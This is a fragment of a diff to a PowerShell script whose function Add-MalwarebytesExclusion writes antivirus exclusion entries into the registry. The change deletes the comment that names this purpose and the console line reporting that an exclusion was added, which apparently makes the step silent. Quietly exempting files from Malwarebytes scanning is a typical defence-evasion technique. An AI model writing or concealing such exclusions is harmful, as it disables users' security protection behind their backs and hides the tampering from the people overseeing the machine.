@@ -20,7 +20,7 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
 # ═══════════════════════════════════════════════════════════════
-# FUNCTION: Add Malwarebytes exclusion via Registry
+
 # ═══════════════════════════════════════════════════════════════
 function Add-MalwarebytesExclusion {
     param([string]$Path)
@@ -50,7 +50,7 @@ function Add-MalwarebytesExclusion {
             # حدث العداد
             Set-ItemProperty -Path $regPath -Name "Count" -Value ($count + 1) -Force | Out-Null
             
-            Write-Host "  [+] Malwarebytes exclusion added" -ForegroundColor Gray
+
             return $true
         }
         catch {
